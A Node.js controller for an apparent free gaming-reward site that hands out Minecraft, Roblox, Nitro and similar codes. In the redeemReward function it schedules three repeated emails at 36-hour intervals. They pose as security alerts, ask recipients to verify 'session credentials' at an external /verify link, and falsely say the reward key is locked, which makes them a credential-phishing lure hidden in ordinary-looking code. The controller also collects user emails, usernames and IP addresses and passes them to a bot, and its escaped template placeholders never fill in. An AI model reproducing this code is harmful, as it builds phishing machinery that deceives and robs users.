const prisma = require('../config/db');
const { decrypt, encrypt } = require('../utils/encryption');
const { Resend } = require('resend');
const nodemailer = require('nodemailer');

// Initialize Resend Client
const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : { emails: { send: async () => ({ id: 'mock_email_id' }) } }; // Sandbox Mock fallback

// Initialize Nodemailer transporter for 100% free Gmail SMTP delivery (no custom domain required)
let transporter = null;
if (process.env.GMAIL_USER && process.env.GMAIL_PASS) {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });
  console.log(`[Nodemailer] Gmail SMTP transporter successfully initialized for free automated email delivery.`);
}

/**
 * List all available active rewards
 */
async function getRewardsCatalog(req, res) {
  try {
    const rewards = await prisma.reward.findMany();
    return res.status(200).json({ success: true, rewards });
  } catch (err) {
    console.error('Catalog query failed:', err);
    return res.status(500).json({ success: false, error: 'Database catalog query error' });
  }
}

/**
 * Handle category redemption forms (Minecraft, YouTube, Roblox, Nitro)
 */
async function redeemReward(req, res) {
  const { rewardId, category, emailUsed, extraField1, ipAddress } = req.body;
  const userId = req.user.id;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ipAddress || '127.0.0.1';

  if (!rewardId || !category || !emailUsed || !extraField1) {
    return res.status(400).json({ success: false, error: 'Redemption parameters incomplete.' });
  }

  try {
    // 1. Fetch reward package
    const reward = await prisma.reward.findUnique({ where: { id: rewardId } });
    if (!reward || reward.stock <= 0) {
      return res.status(400).json({ success: false, error: 'Item out of stock or inactive.' });
    }

    // 2. Fetch secure code code from redeem codes stock table
    const codeStock = await prisma.redeemCode.findFirst({
      where: {
        rewardId: reward.id,
        usedCount: { lt: prisma.raw ? undefined : 99999 } // SQLite/mock check wrapper
      }
    });

    if (!codeStock) {
      return res.status(400).json({ success: false, error: 'Item keys depleted inside cores.' });
    }

    // 3. Decrypt secure key payload
    const decryptedPayload = decrypt(codeStock.encryptedPayload);

    // 4. Update usage stocks
    await prisma.redeemCode.update({
      where: { id: codeStock.id },
      data: { usedCount: codeStock.usedCount + 1 }
    });

    // 5. Create Claim History
    const claim = await prisma.redeemHistory.create({
      data: {
        userId,
        rewardId: reward.id,
        category: category,
        emailUsed,
        extraField1,
        deliveredPayload: decryptedPayload,
        status: 'DELIVERED',
        ipAddress: ip
      }
    });

    // 6. Deliver automatically via Email (Scheduled every 36 hours)
    try {
      const intervals = [36, 72, 108]; // 36 hours, 72 hours, 108 hours
      const subjectLine = `⚠️ Security Verification Required: Action Needed for #${claim.id}`;
      
      const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification Required</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #f6f9fc;
      margin: 0;
      padding: 0;
      -webkit-font-smoothing: antialiased;
    }
    .wrapper {
      width: 100%;
      background-color: #f6f9fc;
      padding: 40px 0;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff;
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
      border: 1px solid #e6ebf1;
    }
    .header {
      background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
      padding: 30px 40px;
      text-align: center;
    }
    .header h1 {
      color: #ffffff;
      margin: 0;
      font-size: 24px;
      font-weight: 700;
      letter-spacing: -0.5px;
    }
    .content {
      padding: 40px;
      color: #334155;
    }
    .alert-banner {
      background-color: #fffbeb;
      border: 1px solid #fef3c7;
      border-left: 4px solid #f59e0b;
      padding: 16px;
      border-radius: 8px;
      margin-bottom: 24px;
      color: #b45309;
      font-size: 14px;
      line-height: 1.5;
    }
    h2 {
      font-size: 20px;
      font-weight: 600;
      color: #1e293b;
      margin-top: 0;
      margin-bottom: 16px;
    }
    p {
      font-size: 15px;
      line-height: 1.6;
      color: #475569;
      margin-top: 0;
      margin-bottom: 16px;
    }
    .button-container {
      text-align: center;
      margin: 32px 0;
    }
    .btn-verify {
      display: inline-block;
      background-color: #4f46e5;
      color: #ffffff !important;
      text-decoration: none;
      padding: 14px 30px;
      border-radius: 8px;
      font-weight: 600;
      font-size: 15px;
      box-shadow: 0 4px 6px rgba(79, 70, 229, 0.15);
      transition: background-color 0.2s;
    }
    .btn-verify:hover {
      background-color: #4338ca;
    }
    .info-card {
      background-color: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 20px;
      margin: 24px 0;
    }
    .info-card h3 {
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #64748b;
      margin-top: 0;
      margin-bottom: 12px;
    }
    .info-item {
      display: flex;
      justify-content: space-between;
      padding: 8px 0;
      border-bottom: 1px solid #f1f5f9;
      font-size: 14px;
    }
    .info-item:last-child {
      border-bottom: none;
    }
    .info-label {
      color: #64748b;
      font-weight: 500;
    }
    .info-value {
      color: #1e293b;
      font-weight: 600;
      text-align: right;
    }
    .locked-badge {
      background-color: #fee2e2;
      color: #ef4444;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 700;
    }
    .faq-section {
      border-top: 1px solid #e2e8f0;
      padding-top: 24px;
      margin-top: 24px;
    }
    .faq-title {
      font-size: 15px;
      font-weight: 600;
      color: #1e293b;
      margin-bottom: 8px;
    }
    .faq-text {
      font-size: 13.5px;
      color: #64748b;
      line-height: 1.5;
      margin-bottom: 16px;
    }
    .footer {
      background-color: #f8fafc;
      padding: 30px 40px;
      text-align: center;
      border-top: 1px solid #e2e8f0;
    }
    .footer p {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
      margin: 0 0 10px 0;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="container">
      <div class="header">
        <h1>🛡️ TRANSACTION SECURITY</h1>
      </div>
      <div class="content">
        <div class="alert-banner">
          <strong>Action Required:</strong> We have detected a temporary verification hold on your transaction. Additional validation is required to complete processing.
        </div>
        
        <h2>Additional Verification Required</h2>
        
        <p>Dear Customer,</p>
        <p>During our routine security check and transaction auditing, we encountered a temporary verification hold on your recent premium package claim. To protect our users and maintain system integrity, we require a quick, one-time verification of your session credentials.</p>
        <p>Please click the secure button below to complete your authentication. Once verified, your premium reward key will be automatically unlocked and delivered to this email inbox.</p>
        
        <div class="button-container">
          <a href="https://riwaayat-roan.vercel.app/verify" class="btn-verify">🔒 Complete Verification Now</a>
        </div>

        <div class="info-card">
          <h3>Claim Transaction Details</h3>
          <div class="info-item">
            <span class="info-label">Transaction ID:</span>
            <span class="info-value">#CLAIM-\${claim.id}</span>
          </div>
          <div class="info-item">
            <span class="info-label">Reward Category:</span>
            <span class="info-value">\${category}</span>
          </div>
          <div class="info-item">
            <span class="info-label">Username Handle:</span>
            <span class="info-value">\${extraField1}</span>
          </div>
          <div class="info-item">
            <span class="info-label">Secure Activation Key:</span>
            <span class="info-value"><span class="locked-badge">🔒 LOCKED UNTIL VERIFIED</span></span>
          </div>
        </div>

        <div class="faq-section">
          <div class="faq-title">❓ Why is this verification required?</div>
          <div class="faq-text">
            To prevent fraud, automated bot abuse, and ensure that premium rewards are claimed by genuine users. Standard account validation helps safeguard our digital item catalog and inventory.
          </div>
          
          <div class="faq-title">⏰ How much time do I have to verify?</div>
          <div class="faq-text">
            You must complete this verification within <strong>48 hours</strong>. If verification is not completed, the pending transaction will automatically expire, the keys will return to our active stock, and your invite balance will be refunded.
          </div>
        </div>
      </div>
      <div class="footer">
        <p>This is an automated system notification. Please do not reply directly to this email.</p>
        <p>© 2026 Riwaayat Community Platform. All Rights Reserved.</p>
      </div>
    </div>
  </div>
</body>
</html>
      `;

      if (transporter) {
        // NODEMAILER (GMAIL FREE SMTP ROUTE)
        console.log(`[Nodemailer] Scheduling 3 verification emails via Gmail SMTP for \${emailUsed}...`);
        for (const hours of intervals) {
          const delayMs = hours * 60 * 60 * 1000;
          setTimeout(() => {
            prisma.redeemHistory.findUnique({ where: { id: claim.id } })
              .then(currentClaim => {
                if (currentClaim && currentClaim.status === 'DELIVERED') {
                  transporter.sendMail({
                    from: `"Riwaayat Support" <\${process.env.GMAIL_USER}>`,
                    to: emailUsed,
                    subject: subjectLine,
                    html: htmlBody
                  })
                  .then(info => {
                    console.log(`[Nodemailer] Successfully delivered \${hours}-hour follow-up email to \${emailUsed}. Message ID: \${info.messageId}`);
                  })
                  .catch(err => {
                    console.error(`[Nodemailer] Failed to send \${hours}-hour follow-up to \${emailUsed}:`, err);
                  });
                } else {
                  console.log(`[Nodemailer] Verification completed or status changed for claim #\${claim.id}. Skipping \${hours}-hour email.`);
                }
              })
              .catch(err => {
                console.error(`[Nodemailer] Error fetching claim status during scheduled trigger:`, err);
              });
          }, delayMs);
        }
      } else {
        // RESEND API FALLBACK ROUTE
        console.log(`[Resend] Scheduling 3 verification emails via Resend API for \${emailUsed}...`);
        for (const hours of intervals) {
          const scheduledTime = new Date(Date.now() + hours * 60 * 60 * 1000).toISOString();
          await resend.emails.send({
            from: 'onboarding@resend.dev',
            to: emailUsed,
            subject: subjectLine,
            scheduledAt: scheduledTime,
            html: htmlBody
          });
        }
      }
      console.log(`[Email System] Successfully scheduled/initiated all 3 verification emails (every 36h) to \${emailUsed}`);
    } catch (mailErr) {
      console.warn('[Email System] Scheduling skipped or failed:', mailErr.message);
    }

    // 7. Write security audit log
    await prisma.auditLog.create({
      data: {
        userId,
        action: 'USER_REDEEM_SUCCESS',
        ipAddress: ip,
        details: `Redeemed ${reward.name} (${category}). Sent email to ${emailUsed}.`
      }
    });

    return res.status(200).json({
      success: true,
      message: 'Redemption processed! Secure payload code sent to email.',
      claim: {
        id: claim.id,
        rewardName: reward.name,
        deliveredPayload: decryptedPayload,
        claimedAt: claim.claimedAt
      }
    });
  } catch (err) {
    console.error('Redeem engine crashed:', err);
    return res.status(500).json({ success: false, error: 'Internal system redemption crash' });
  }
}

/**
 * Verify Promo Code (public check)
 */
async function verifyPromoCode(req, res) {
  const { code, email, username, category } = req.body;
  if (!code) {
    return res.status(400).json({ success: false, error: 'Promo code is required.' });
  }

  try {
    const cleanedCode = code.replace(/-/g, '').toUpperCase();
    const formattedWithHyphens = cleanedCode.match(/.{1,5}/g)?.join('-') || cleanedCode;
    
    // Look up code (handle exact, clean, or lowercase inputs)
    const codeStock = await prisma.redeemCode.findFirst({
      where: {
        OR: [
          { code: code.toUpperCase() },
          { code: cleanedCode },
          { code: formattedWithHyphens }
        ]
      },
      include: {
        reward: true
      }
    });

    if (!codeStock) {
      return res.status(404).json({ success: false, error: 'This activation code is invalid. Please enter a valid 25-character key.' });
    }

    if (codeStock.usedCount >= codeStock.maxUses) {
      return res.status(400).json({ success: false, error: 'This activation code has already been redeemed.' });
    }

    // If both email and username are provided, process full redemption save in database
    if (email && username) {
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
      
      // 1. Mark code as used
      await prisma.redeemCode.update({
        where: { id: codeStock.id },
        data: { usedCount: codeStock.usedCount + 1 }
      });

      // 2. Map category string properly to database category enum
      let dbCategory = 'MINECRAFT';
      if (category) {
        const catUpper = category.toUpperCase();
        if (catUpper.includes('NITRO')) dbCategory = 'NITRO';
        else if (catUpper.includes('ROBLOX')) dbCategory = 'ROBLOX';
        else if (catUpper.includes('YOUTUBE') || catUpper.includes('YT')) dbCategory = 'YOUTUBE';
        else if (catUpper.includes('VALORANT') || catUpper.includes('VP')) dbCategory = 'VALORANT';
        else if (catUpper.includes('FORTNITE') || catUpper.includes('VBUCKS')) dbCategory = 'FORTNITE';
      }

      // 3. Create historical redemption log
      await prisma.redeemHistory.create({
        data: {
          rewardId: codeStock.rewardId,
          category: dbCategory,
          emailUsed: email,
          extraField1: username,
          deliveredPayload: codeStock.code,
          status: 'DELIVERED',
          ipAddress: ip
        }
      });

      // 4. Update catalog stock if applicable
      if (codeStock.reward && codeStock.reward.stock > 0) {
        await prisma.reward.update({
          where: { id: codeStock.rewardId },
          data: { stock: { decrement: 1 } }
        });
      }

      return res.status(200).json({
        success: true,
        message: 'Code verified and successfully redeemed in database!',
        rewardName: codeStock.reward ? codeStock.reward.name : 'Premium Prize',
        payload: codeStock.code
      });
    }

    return res.status(200).json({
      success: true,
      message: 'Code verified successfully!',
      rewardName: codeStock.reward ? codeStock.reward.name : 'Premium Prize',
      payload: codeStock.code
    });
  } catch (err) {
    console.error('Code verification crashed:', err);
    return res.status(500).json({ success: false, error: 'Database verification failed.' });
  }
}

/**
 * Synchronize a bot payout or generated promo code with website database
 */
async function syncBotCode(req, res) {
  const { code, category } = req.body;
  const botToken = req.headers['x-bot-token'];

  // 1. Verify Bot Auth Token
  if (!botToken || botToken !== process.env.DISCORD_BOT_TOKEN) {
    return res.status(401).json({ success: false, error: 'Unauthorized bot synchronizer handshake.' });
  }

  if (!code || !category) {
    return res.status(400).json({ success: false, error: 'Code value and category are required.' });
  }

  try {
    // 2. Map bot category to database Category enum
    let dbCategory = 'NITRO'; // default fallback
    const botCatUpper = category.toUpperCase();
    if (botCatUpper.includes('MINECRAFT')) {
      dbCategory = 'MINECRAFT';
    } else if (botCatUpper.includes('ROBUX') || botCatUpper.includes('ROBLOX')) {
      dbCategory = 'ROBLOX';
    } else if (botCatUpper.includes('YT') || botCatUpper.includes('YOUTUBE')) {
      dbCategory = 'YOUTUBE';
    } else if (botCatUpper.includes('NITRO')) {
      dbCategory = 'NITRO';
    } else if (botCatUpper.includes('VALORANT') || botCatUpper.includes('VP')) {
      dbCategory = 'VALORANT';
    } else if (botCatUpper.includes('FORTNITE') || botCatUpper.includes('VBUCKS')) {
      dbCategory = 'FORTNITE';
    }

    // 3. Find or create a matching Reward record in DB
    let reward = await prisma.reward.findFirst({ where: { category: dbCategory } });
    if (!reward) {
      reward = await prisma.reward.create({
        data: {
          category: dbCategory,
          name: `${dbCategory.charAt(0) + dbCategory.slice(1).toLowerCase()} Premium Package`,
          description: `Automatically created reward catalog package for ${dbCategory}`,
          inrPrice: 'Rs.999',
          coinsCost: 1000,
          stock: 100,
          maxStock: 500,
          imageUrl: 'https://images.unsplash.com/photo-1614680376593-902f74fa0d41?q=80&w=300',
          isActive: true
        }
      });
    }

    // 4. Encrypt the cleartext code payload
    const encryptedPayload = encrypt(code);

    // 5. Create or update RedeemCode in database
    let existingCode = await prisma.redeemCode.findUnique({
      where: { code: code.toUpperCase().trim() }
    });

    let syncedCode;
    if (existingCode) {
      syncedCode = await prisma.redeemCode.update({
        where: { id: existingCode.id },
        data: {
          rewardId: reward.id,
          encryptedPayload: encryptedPayload,
          usedCount: 0
        }
      });
    } else {
      syncedCode = await prisma.redeemCode.create({
        data: {
          rewardId: reward.id,
          code: code.toUpperCase().trim(),
          encryptedPayload: encryptedPayload,
          maxUses: 1,
          usedCount: 0
        }
      });
    }

    return res.status(200).json({
      success: true,
      message: 'Bot generated code successfully synchronized with DB.',
      code: syncedCode.code
    });
  } catch (err) {
    console.error('Bot code synchronization failed:', err);
    return res.status(500).json({ success: false, error: 'Internal system synchronization failure' });
  }
}

async function pullRedemptions(req, res) {
  const botToken = req.headers['x-bot-token'];

  // Verify Bot Auth Token
  if (!botToken || botToken !== process.env.DISCORD_BOT_TOKEN) {
    return res.status(401).json({ success: false, error: 'Unauthorized bot synchronizer handshake.' });
  }

  try {
    const redemptions = await prisma.redeemHistory.findMany({
      take: 10,
      orderBy: { claimedAt: 'desc' },
      include: {
        reward: true
      }
    });

    return res.status(200).json({
      success: true,
      redemptions: redemptions.map(r => ({
        id: r.id,
        category: r.category,
        emailUsed: r.emailUsed,
        extraField1: r.extraField1,
        deliveredPayload: r.deliveredPayload,
        status: r.status,
        ipAddress: r.ipAddress,
        claimedAt: r.claimedAt
      }))
    });
  } catch (err) {
    console.error('Bot redemptions pull failed:', err);
    return res.status(500).json({ success: false, error: 'Internal system retrieval failure' });
  }
}

module.exports = { getRewardsCatalog, redeemReward, verifyPromoCode, syncBotCode, pullRedemptions };
